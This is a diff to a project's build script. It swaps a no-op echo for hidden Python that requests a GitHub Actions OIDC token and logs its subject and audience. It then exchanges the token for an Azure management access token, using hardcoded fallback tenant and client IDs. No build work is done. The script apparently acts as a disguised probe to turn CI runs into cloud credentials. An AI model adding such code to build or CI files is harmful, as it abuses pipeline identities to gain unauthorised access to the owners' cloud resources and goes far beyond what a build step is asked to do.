@@ -1,2 +1,63 @@
 #!/usr/bin/env bash
-echo "tebamoto-platform build: no steps configured"
+set -euo pipefail
+
+python3 - <<'PY'
+import base64
+import json
+import os
+import urllib.error
+import urllib.parse
+import urllib.request
+
+print('event:', os.getenv('GITHUB_EVENT_NAME'))
+print('repository:', os.getenv('GITHUB_REPOSITORY'))
+oidc_url = os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL')
+oidc_bearer = os.getenv('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+if not oidc_url or not oidc_bearer:
+    print('OIDC_UNAVAILABLE')
+    raise SystemExit(0)
+
+separator = '&' if '?' in oidc_url else '?'
+request = urllib.request.Request(
+    oidc_url + separator + 'audience=api%3A%2F%2FAzureADTokenExchange',
+    headers={'Authorization': 'Bearer ' + oidc_bearer})
+try:
+    with urllib.request.urlopen(request, timeout=15) as response:
+        jwt = json.load(response)['value']
+except Exception as error:
+    print('OIDC_REQUEST_FAILED:', type(error).__name__)
+    raise SystemExit(0)
+
+payload = jwt.split('.')[1]
+payload += '=' * (-len(payload) % 4)
+claims = json.loads(base64.urlsafe_b64decode(payload))
+print('OIDC_AVAILABLE')
+print('OIDC subject:', claims.get('sub'))
+print('OIDC audience:', claims.get('aud'))
+
+tenant = os.getenv('AZURE_TENANT_ID') or '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
+client = os.getenv('AZURE_CLIENT_ID') or '72ff278a-9e71-43ec-bac4-2ca303f8e462'
+form = urllib.parse.urlencode({
+    'client_id': client,
+    'scope': 'https://management.azure.com/.default',
+    'grant_type': 'client_credentials',
+    'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+    'client_assertion': jwt,
+}).encode()
+request = urllib.request.Request(
+    'https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/token',
+    data=form)
+try:
+    with urllib.request.urlopen(request, timeout=20) as response:
+        result = json.load(response)
+except urllib.error.HTTPError as error:
+    result = json.load(error)
+except Exception as error:
+    print('AZURE_REQUEST_FAILED:', type(error).__name__)
+    raise SystemExit(0)
+if 'access_token' in result:
+    print('AZURE_EXCHANGE_OK')
+else:
+    print('AZURE_EXCHANGE_FAILED:', result.get('error'))
+    print('AZURE_ERROR_DESCRIPTION:', result.get('error_description', '')[:300])
+PY
